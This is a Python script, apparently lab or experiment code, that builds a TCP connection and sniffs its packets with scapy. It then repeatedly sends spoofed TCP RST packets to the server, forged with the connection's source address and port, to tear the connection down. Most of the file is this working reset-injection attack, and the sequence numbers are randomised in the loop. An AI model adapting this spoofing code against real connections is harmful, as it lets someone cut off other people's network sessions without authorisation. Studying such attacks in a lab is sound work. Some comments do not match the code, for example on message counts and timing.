import socket
import time
from scapy.all import sniff, send, TCP, IP
from threading import Thread
from queue import SimpleQueue
import numpy as np
import netifaces

def get_ip_address(interface):
    try:
        # Get the addresses associated with the interface
        addresses = netifaces.ifaddresses(interface)
        
        # Get the IPv4 address
        ipv4_info = addresses[netifaces.AF_INET][0]
        ipv4_address = ipv4_info['addr']
        
        return ipv4_address
    except KeyError:
        print(f"Interface {interface} does not have an IPv4 address.")
        return None
    except ValueError:
        print(f"Interface {interface} not found.")
        return None

que = SimpleQueue()

class VictimConnection:

    def __init__(self, server_addr, server_port, src_port):
        """
        Establish a TCP connection to the server with source_port
        Store the socket in self.conn
        """
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Bind the socket to the source port
        if src_port:
            self.conn.bind(('', src_port))
        
        # Connect to the server
        self.conn.connect((server_addr, server_port))
        self.victim_port = self.conn.getsockname()[1]

        # Send message every second for 30 times
        def send_hi():
            for i in range(10):
                try:
                    self.conn.sendall(f"hi {i}\n".encode())
                    print(f"Victim sent to server")
                    time.sleep(np.random.randint(15, 20))
                except Exception as e:
                    print(f"Error sending message: {e}")
                    break
            self.conn.sendall(b'finish')
            self.conn.close()

        Thread(target=send_hi).start()



def packet_callback(packet):
    if IP in packet and TCP in packet:
        # ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        seq_num = tcp_layer.seq
        ack_num = tcp_layer.ack
        window = tcp_layer.window
        seq_end = seq_num + len(tcp_layer.payload)
        que.put({
            "seq": seq_end,
            "ack": ack_num,
            "window": window,
        })

if __name__ == '__main__':
    server_addr = 'your ip here'  # This is the ip of the destination of victim's connection
    server_port = 8005  # Destination port, usually 80/443
    victim_addr = get_ip_address('en0')
    # victim_port = np.random.randint(12340, 12350)
    victim = VictimConnection(server_addr, server_port, None)
    victim_port = victim.victim_port
    print(victim_addr, victim_port)
    Thread(target=sniff, kwargs={
        "filter": f"dst host {server_addr} and src port {victim_port}",
        "prn": packet_callback
    }).start()

    last_seq = 0
    last_ack = 0
    last_win = 0
    for _ in range(30):
        time.sleep(2)
        while not que.empty():
            t = que.get()
            last_seq = t['seq']
            if t['ack']:
                last_ack = t['ack']
            last_win = t['window']
        last_seq = np.random.randint(1 << 32)
        if last_seq and last_win:
            send(IP(src=victim_addr, dst=server_addr) / TCP(sport=victim_port,
                                                            dport=server_port,
                                                            flags='R',
                                                            seq=last_seq,
                                                            # ack=last_ack,
                                                            window=last_win))
            print(f"Sent rst with seq {last_seq} and ack {last_ack} and window {last_win}")
            time.sleep(15)




